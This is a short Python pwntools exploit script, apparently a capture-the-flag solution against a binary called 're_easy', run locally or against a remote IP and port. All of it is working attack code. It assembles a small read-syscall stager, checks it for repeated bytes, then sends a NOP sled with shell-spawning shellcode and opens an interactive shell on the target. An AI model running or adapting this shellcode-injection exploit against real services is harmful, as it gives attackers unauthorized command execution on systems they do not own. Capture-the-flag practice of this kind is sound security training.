from pwn import *
import sys, time

context.binary = "./re_easy"

if len(sys.argv) == 1:
    p = process(["./re_easy"])
    log.info("PID : " + str(proc.pidof(p)[0]))
#   pause()

else:
    p = remote("13.112.180.65", "8361")

sc2 = asm('''
        mov dh, 0x34
        mov rsi, rsp
        syscall
        ''')

print sc2
print "len : ", len(sc2)

print sc2.encode("hex")
for i in xrange(1, len(sc2)):
    for j in xrange(i):
        if sc2[i] == sc2[j]:
            print hex(ord(sc2[i]))


p.sendline(sc2)
p.sendline("\x90" * 0xd00 + asm(shellcraft.sh()))
p.interactive()
